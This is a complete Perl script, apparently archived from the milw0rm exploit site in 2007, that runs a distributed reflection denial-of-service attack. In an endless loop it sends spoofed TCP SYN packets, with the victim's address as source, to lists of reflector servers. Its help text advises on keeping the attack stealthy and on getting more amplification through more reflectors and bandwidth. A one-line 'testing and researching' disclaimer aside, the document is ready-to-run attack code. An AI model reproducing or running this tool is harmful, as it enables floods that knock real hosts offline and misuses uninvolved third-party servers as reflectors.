<html><head><title>DRDoS - Distributed Reflection Denial of Service</title></head><pre>#!/usr/bin/perl

#
# ~written by whoppix (c) 2007~
# This Piece of software may be freely (re-)distributed under the Terms of the LGPL.
# for a short usage type ./script --help
# this program requires: perl, Net::RawIP (depends on libpcap), Getopt::Long
# (which should be shipped along with your perl core distribution)
# if you want to gain a deeper understanding about how DRDoS works, have a look at:
# http://www.grc.com/dos/drdos.htm
# This program is written for testing and researching purposes only.
#

use warnings;
use strict;
use Net::RawIP;
use Getopt::Long;

my $verbose   = '0';
my $syn_count = '1';
my $victim    = '127.0.0.1';
my @lists     = ();
my $net       = new Net::RawIP;

GetOptions(
	'verbose+'    =&gt; \$verbose,
	'syn_count=s' =&gt; \$syn_count,
	'list=s'      =&gt; \@lists,
	'help'        =&gt; \&amp;usage,       
);
$victim = shift @ARGV;
if ( !$victim ) {
	die &quot;Error: No target specified, use --help\n&quot;;
}
if ( !@lists ) {
	die &quot;Error: You have to specify at least one reflector list, use --help\n&quot;;
}
foreach my $file (@lists) {
	if ( !-e $file ) {
		die &quot;File does not seem to exist: $file\n&quot;;
	}
}
print &quot;Starting attack on target $victim.\n&quot;;
print &quot;press Ctrl-C to interrupt at any time.\n&quot; if $verbose &gt;= 1;
while (1) {
	foreach my $listfile (@lists) {
		print &quot;Loading reflector file: $listfile\n&quot; if $verbose &gt;= 1;
		open( my $list, &quot;&lt;&quot;, $listfile )
			or die &quot;Error opening file for reading: $listfile\n&quot;;
		while (&lt;$list&gt;) {
			chomp;
			if ( check_format($_) ) {
				my $counter   = $syn_count;
				my $reflector = $_;
				my ( $ip, $port ) = split( ':', $reflector );
				print &quot;reflector ip: $ip, reflector port: $port\n&quot;
					if $verbose &gt; 1;
				for ( my $counter = $syn_count; $counter &gt; 0; $counter-- ) {
					print &quot;attacking using reflector: $reflector\n&quot;
						if $verbose &gt; 1;
					my $rand = int( rand(65535) );
					while ( $rand == 0 ) {
						print
							&quot;random number calculated for SRCPORT was zero, retrying...\n&quot;
							if $verbose &gt; 1;
						$rand = int( rand(65535) );
					}
					print &quot;random port used for SRCPORT: $rand\n&quot;
						if $verbose &gt; 1;
					$net-&gt;set(
						{   ip =&gt; {
								saddr =&gt; $victim,
								daddr =&gt; $ip,
							},
							tcp =&gt; {
								source =&gt; $rand,
								dest   =&gt; $port,
								syn    =&gt; 1,
							},
						}
					);
					$net-&gt;send();
				}
			}
			else {
				print
					&quot;mirror \&quot;$_\&quot; not in correct format (ip:port) omitting...\n&quot;
					if $verbose &gt;= 1;
			}
		}
	}
}

sub usage {
	print &quot;\nusage:\n\n&quot;;
	print &quot;--help\t\t: youre reading it\n&quot;;
	print
		&quot;--verbose\t: makes the script more verbose. can be used several times to increase verbosity.\n&quot;;
	print &quot;--list\t\t: used to specify a reflectorlist.\n&quot;;
	print
		&quot;\t\texample: ./script --list list1.txt --list list2.txt --list list3.txt 127.0.0.1\n&quot;;
	print
		&quot;\t\tthe more (and longer) lists you have, the better will the result be, and the more stealth you will gain.\n&quot;;
	print
		&quot;--syn_count\t: used to set the syn_count to a special value. default is 1.\n&quot;;
	print &quot;\t\tdon't use too much - that would decrease your stealth. Default (and that should be fine) is 1.\n&quot;;
	print &quot;\nGeneral information:\n&quot;;
	print &quot;The usage of multiple lists can increase your stealth.\n&quot;;
	print &quot;The more Mirrors or \&quot;reflectors\&quot; you use, the better will the result be.\n&quot;;
	print &quot;The better the bandwidth of your mirrors is, the better will the result be.\n&quot;;
	print &quot;Generally spoken is the bandwidth you use to flood your victim amplified by the factor 3-4.\n\n&quot;;
	die &quot;\n&quot;;
}

sub check_format {    # a function to check the ip:port format.
	no warnings;
	my $address = shift;
	my ( $ip, $port ) = split( ':', $address );
	my @octets = split( '\.', $ip );

	if ( $port &lt; 1 or $port &gt; 65535 ) {
		print &quot;port $port too high or low\n&quot; if $verbose &gt;= 1;
		return;
	}
	if ( @octets != 4 ) {
		print &quot;ip has invalid number of octetts: $ip\n&quot; if $verbose &gt;= 1;
		return;
	}
	foreach my $octet (@octets) {
		if ( $octet &lt; 0 or $octet &gt; 255 ) {
			print &quot;octet is invalid: $octet\n&quot; if $verbose &gt;= 1;
			return;
		}
	}
	print &quot;VALID!\n&quot; if $verbose &gt; 1;
	return 1;
}

# milw0rm.com [2007-06-06]</pre></html>